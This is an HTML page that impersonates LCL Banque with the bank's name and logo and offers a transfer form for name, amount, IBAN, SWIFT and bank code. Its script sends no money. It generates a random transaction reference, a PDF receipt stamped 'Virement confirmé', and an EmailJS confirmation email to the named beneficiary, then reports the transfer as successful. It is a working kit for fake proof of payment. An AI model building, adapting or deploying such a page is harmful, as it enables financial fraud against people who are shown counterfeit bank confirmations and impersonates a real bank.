<!doctype html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Virement bancaire - LCL Banque</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    body { font-family: 'Inter', sans-serif; }
  </style>

  <link rel="icon" type="image/png" href="https://www.pagesjaunes.fr/media/agc/f9/6e/30/00/00/3f/00/7b/57/67/666af96e3000003f007b5767/666af972300000ea1c7b5776.jpg">
  <link rel="apple-touch-icon" href="https://www.pagesjaunes.fr/media/agc/f9/6e/30/00/00/3f/00/7b/57/67/666af96e3000003f007b5767/666af972300000ea1c7b5776.jpg">
  <link rel="shortcut icon" href="https://www.pagesjaunes.fr/media/agc/f9/6e/30/00/00/3f/00/7b/57/67/666af96e3000003f007b5767/666af972300000ea1c7b5776.jpg">
</head>

<body class="bg-slate-50 min-h-screen text-slate-900">
  <div class="text-center py-6 flex flex-col items-center">
    <img src="https://www.pagesjaunes.fr/media/agc/f9/6e/30/00/00/3f/00/7b/57/67/666af96e3000003f007b5767/666af972300000ea1c7b5776.jpg" alt="LCL Banque" class="h-12 mb-2" />
    <p class="text-slate-500 mt-1">Banque en ligne sécurisée</p>
  </div>

  <div class="max-w-4xl mx-auto px-4 pb-10">
    <div class="bg-white rounded-3xl shadow-xl overflow-hidden border border-slate-200">
      <div class="bg-gradient-to-r from-[#272E80] to-[#060a36] text-white px-6 py-8 sm:px-8">
        <h1 class="text-2xl sm:text-3xl font-bold">Effectuer un virement</h1>
        <p class="mt-2 text-white/85">Renseignez les informations ci-dessous pour confirmer la transaction.</p>
      </div>

      <div class="p-6 sm:p-8">
        <form id="transferForm" class="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label for="nom" class="block text-sm font-semibold text-slate-700 mb-2">Nom</label>
            <input id="nom" type="text" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div>
            <label for="prenoms" class="block text-sm font-semibold text-slate-700 mb-2">Prénom(s)</label>
            <input id="prenoms" type="text" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div>
            <label for="montant" class="block text-sm font-semibold text-slate-700 mb-2">Montant</label>
            <input id="montant" type="number" step="0.01" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div>
            <label for="iban" class="block text-sm font-semibold text-slate-700 mb-2">IBAN</label>
            <input id="iban" type="text" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div>
            <label for="emailBeneficiaire" class="block text-sm font-semibold text-slate-700 mb-2">Mail du bénéficiaire</label>
            <input id="emailBeneficiaire" type="email" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]" placeholder="beneficiaire@email.com">
          </div>

          <div>
            <label for="swift" class="block text-sm font-semibold text-slate-700 mb-2">Code SWIFT</label>
            <input id="swift" type="text" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div>
            <label for="codeBanque" class="block text-sm font-semibold text-slate-700 mb-2">Code banque</label>
            <input id="codeBanque" type="text" required class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]">
          </div>

          <div class="md:col-span-2">
            <label for="motif" class="block text-sm font-semibold text-slate-700 mb-2">Motif (facultatif)</label>
            <textarea id="motif" rows="4" class="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:ring-2 focus:ring-[#FFD300]"></textarea>
          </div>

          <div class="md:col-span-2 flex flex-col sm:flex-row gap-3 pt-2">
            <button id="submitBtn" type="submit" class="flex-1 rounded-xl bg-[#272E80] px-5 py-3 font-semibold text-white hover:bg-[#1f2465] transition">
              VALIDER
            </button>
            <a href="index.html" class="flex-1 rounded-xl bg-slate-100 px-5 py-3 font-semibold text-slate-700 hover:bg-slate-200 transition text-center">
              Retour
            </a>
          </div>
        </form>

        <div id="message" class="hidden mt-6 rounded-xl p-4 text-sm"></div>
      </div>
    </div>
  </div>

  <script>
    emailjs.init({ publicKey: 'Ks5On0NLoesZo0911' });

    const form = document.getElementById('transferForm');
    const messageBox = document.getElementById('message');
    const submitBtn = document.getElementById('submitBtn');
    const LOGO_URL = 'https://www.pagesjaunes.fr/media/agc/f9/6e/30/00/00/3f/00/7b/57/67/666af96e3000003f007b5767/666af972300000ea1c7b5776.jpg';
    const LOGO_URL2 = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8V_YLaIt50XR2k7BN0892YedNCwMlozbX_w&s';

    function getData() {
      return {
        nom: document.getElementById('nom').value.trim(),
        prenoms: document.getElementById('prenoms').value.trim(),
        montant: document.getElementById('montant').value.trim(),
        iban: document.getElementById('iban').value.trim(),
        swift: document.getElementById('swift').value.trim(),
        codeBanque: document.getElementById('codeBanque').value.trim(),
        emailBeneficiaire: document.getElementById('emailBeneficiaire').value.trim(),
        motif: document.getElementById('motif').value.trim()
      };
    }

    function showMessage(text, ok = true) {
      messageBox.className = 'mt-6 rounded-xl p-4 text-sm ' + (ok ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-700 border border-red-200');
      messageBox.textContent = text;
      messageBox.classList.remove('hidden');
    }

    function generateReference() {
      const chars = '0123456789';
      let ref = 'LCL-';
      for (let i = 0; i < 10; i++) ref += chars.charAt(Math.floor(Math.random() * chars.length));
      return ref;
    }

    function formatDateTime(date) {
      return new Intl.DateTimeFormat('fr-FR', {
        dateStyle: 'full',
        timeStyle: 'short'
      }).format(date);
    }

    function loadImage(url) {
      return new Promise((resolve, reject) => {
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = () => resolve(img);
        img.onerror = reject;
        img.src = url;
      });
    }

    async function generatePDF(data, ref, datetime) {
      const { jsPDF } = window.jspdf;
      const doc = new jsPDF();

      doc.setProperties({
        title: 'Justificatif de virement',
        subject: 'Confirmation bancaire LCL Banque',
        author: 'LCL Banque',
        keywords: 'LCL Banque, virement, confirmation, banque'
      });

      doc.setFillColor(39, 46, 128);
      doc.rect(0, 0, 210, 36, 'F');

      try {
        const logo = await loadImage(LOGO_URL2);
        doc.addImage(logo, 'PNG', 14, 8, 24, 18);
      } catch (e) {}

      doc.setTextColor(255, 255, 255);
      doc.setFont('helvetica', 'bold');
      doc.setFontSize(18);
      doc.text('LCL Banque', 42, 18);
      doc.setFontSize(10);
      doc.setFont('helvetica', 'normal');
      doc.text('Virement confirmé', 42, 26);

      doc.setTextColor(15, 23, 42);
      doc.setFontSize(12);
      doc.setFont('helvetica', 'bold');
      doc.text('Référence transaction', 14, 52);
      doc.setFont('helvetica', 'normal');
      doc.text(ref, 72, 52);

      doc.setFont('helvetica', 'bold');
      doc.text('Date et heure', 14, 60);
      doc.setFont('helvetica', 'normal');
      doc.text(datetime, 72, 60);

      doc.setDrawColor(226, 232, 240);
      doc.line(14, 66, 196, 66);

      doc.setFillColor(248, 250, 252);
      doc.roundedRect(14, 74, 182, 74, 4, 4, 'F');
      doc.setDrawColor(203, 213, 225);
      doc.roundedRect(14, 74, 182, 74, 4, 4, 'S');

      doc.setFont('helvetica', 'bold');
      doc.text('Informations de la transaction', 20, 86);

      doc.setFont('helvetica', 'normal');
      doc.text(`Nom: ${data.nom}`, 20, 98);
      doc.text(`Prénom(s): ${data.prenoms}`, 20, 106);
      doc.text(`Montant: ${data.montant} EUR`, 20, 114);
      doc.text(`IBAN: ${data.iban}`, 20, 122);
      doc.text(`Code SWIFT: ${data.swift}`, 20, 130);
      doc.text(`Code banque: ${data.codeBanque}`, 20, 138);

      if (data.motif) {
        doc.setFont('helvetica', 'bold');
        doc.text('Motif:', 20, 150);
        doc.setFont('helvetica', 'normal');
        const lines = doc.splitTextToSize(data.motif, 140);
        doc.text(lines, 40, 150);
      }

      doc.setDrawColor(148, 163, 184);
      doc.line(14, 204, 90, 204);
      doc.text('Signature du client', 14, 212);

      doc.line(120, 204, 196, 204);
      doc.text('Validation banque', 120, 212);

      doc.setFontSize(10);
      doc.setTextColor(100, 116, 139);
      doc.text('Merci pour votre confiance.', 14, 285);

      doc.save(`virement_${ref}.pdf`);
    }

    async function sendConfirmationEmail(data, ref) {
      return emailjs.send('service_y2dd241', 'template_4cdo1yk', {
        to_email: data.emailBeneficiaire,
        beneficiary_name: `${data.nom} ${data.prenoms}`,
        amount: data.montant,
        reference: ref,
        iban: data.iban,
        swift: data.swift,
        bank_code: data.codeBanque,
        motif: data.motif || '-',
        logo_url: LOGO_URL2
      });
    }

    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      const data = getData();
      const ref = generateReference();
      const datetime = formatDateTime(new Date());

      submitBtn.disabled = true;
      submitBtn.textContent = 'EN COURS...';

      try {
        await generatePDF(data, ref, datetime);
        await sendConfirmationEmail(data, ref);
        showMessage(`Virement effectué avec succès. Un message de confirmation a été envoyé au bénéficiaire. Référence: ${ref}`, true);
        form.reset();
      } catch (error) {
        showMessage('Erreur lors de la génération du PDF ou de l’envoi du message.', false);
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'VALIDER';
      }
    });
  </script>
</body>
</html>
